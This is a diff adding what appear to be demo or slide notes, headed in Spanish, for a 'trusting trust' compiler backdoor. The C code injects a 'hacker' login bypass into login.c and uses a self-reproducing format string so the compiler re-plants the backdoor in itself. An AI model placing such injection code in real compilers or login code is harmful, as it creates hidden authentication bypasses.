@@ -1,0 +1,77 @@
+CARITA FELIZ
+😁
+
+INYECCIÓN LOGIN
+    void inject(string sourceHook, string text) {
+        int newSize = strlen(code) + strlen(text);
+        string buffer = (string) calloc(newSize + 1, sizeof(char));
+
+        char* injectLocation = strstr(code, sourceHook) + strlen(sourceHook);
+
+        strncpy(buffer, code, injectLocation - code);
+        strcat(buffer, text);
+        strcat(buffer, injectLocation);
+
+        free(code);
+        code = buffer;
+    }
+
+    if (strstr(source, "login.c") != NULL) {
+        string sourceHook = "bool authorized(account accounts[], string usr, string pwd) {";
+        string hack = "if (equals(usr, \"hacker\")) { return true; }";
+
+        inject(sourceHook, hack);
+    }
+
+INYECCIÓN LOGIN + COMPILADOR
+    string hackCompiler = ""
+        "string hackCompiler = %c%s%c;"
+        "void inject(string sourceHook, string text) {"
+        "    int newSize = strlen(code) + strlen(text);"
+        "    string buffer = (string) calloc(newSize + 1, sizeof(char));"
+        "    char* injectLocation = strstr(code, sourceHook) + strlen(sourceHook);"
+        "    strncpy(buffer, code, injectLocation - code);"
+        "    strcat(buffer, text);"
+        "    strcat(buffer, injectLocation);"
+        "    free(code);"
+        "    code = buffer;"
+        "}"
+        "if (strstr(source, %clogin.c%c) != NULL) {"
+        "    string sourceHook = %cbool authorized(account accounts[], string usr, string pwd) {%c;"
+        "    string hack = %cif (equals(usr, %c%chacker%c%c)) { return true; }%c;"
+        "    inject(sourceHook, hack);"
+        "}"
+        "if (strstr(source, %ccompiler.c%c) != NULL) {"
+        "    string sourceHook = %cstring code = readFile(source);%c;"
+        "    string hack = format(hackCompiler, 34, hackCompiler, 34, 34, 34, 34, 34, 34, 92, 34, 92, 34, 34, 34, 34, 34, 34);"
+        "    inject(sourceHook, hack);"
+        "}";
+
+    void inject(string sourceHook, string text) {
+        int newSize = strlen(code) + strlen(text);
+        string buffer = (string) calloc(newSize + 1, sizeof(char));
+
+        char* injectLocation = strstr(code, sourceHook) + strlen(sourceHook);
+
+        strncpy(buffer, code, injectLocation - code);
+        strcat(buffer, text);
+        strcat(buffer, injectLocation);
+
+        free(code);
+        code = buffer;
+    }
+
+    if (strstr(source, "login.c") != NULL) {
+        string sourceHook = "bool authorized(account accounts[], string usr, string pwd) {";
+        string hack = "if (equals(usr, \"hacker\")) { return true; }";
+
+        inject(sourceHook, hack);
+    }
+
+    if (strstr(source, "compiler.c") != NULL) {
+        string sourceHook = "string code = readFile(source);";
+        string hack = format(hackCompiler, 34, hackCompiler, 34, 34, 34, 34, 34, 34, 92, 34, 92, 34, 34, 34, 34, 34, 34);
+
+        inject(sourceHook, hack);
+    }
+
